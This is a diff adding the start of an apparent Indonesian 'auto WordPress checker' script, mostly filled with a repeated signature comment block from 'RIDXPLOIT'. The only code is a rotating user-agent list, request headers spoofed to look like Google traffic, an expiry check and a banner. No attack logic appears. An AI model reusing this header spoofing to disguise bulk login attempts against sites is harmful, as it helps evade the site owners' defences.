+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+# List of user agents
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:124.0) Gecko/20100101 Firefox/124.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.140 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1"
+]
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+def generate_headers():
+    return {
+        "User-Agent": random.choice(user_agents),
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Connection": "keep-alive",
+        "Referer": "https://www.google.com/",
+        "Origin": "https://www.google.com",
+        "Upgrade-Insecure-Requests": "1",
+        "Cache-Control": "no-cache"
+    }
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+def check_time_limit():
+    end_date = datetime(2026, 1, 30)
+    if datetime.now() > end_date:
+        print(f"{R}[×] Masa penggunaan program telah habis.{W}")
+        exit()
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+def banner():
+    print(f"""{C}
+██╗    ██╗ ██████╗ ██████╗ ██████╗ ██████╗ ██████╗ ███████╗███████╗███████╗
+██║    ██║██╔═══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝
+██║ █╗ ██║██║   ██║██████╔╝██║  ██║██████╔╝██████╔╝█████╗  ███████╗███████╗
+██║███╗██║██║   ██║██╔══██╗██║  ██║██╔═══╝ ██╔══██╗██╔══╝  ╚════██║╚════██║
+╚███╔███╔╝╚██████╔╝██║  ██║██████╔╝██║     ██║  ██║███████╗███████║███████║
+ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
+{Y}             AUTO WORDPRESS CHAKER | BY FAROTCOLIX.ID
+{W}""")
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
+#di akuin bahwa ini tools lu juga boleh
+
+
+#INDRAMAYU-CHAOS-SYSTEM
+#SALAM DARI RIDXPLOIT
+#silahkan renam bang
+#silahkan meninggi
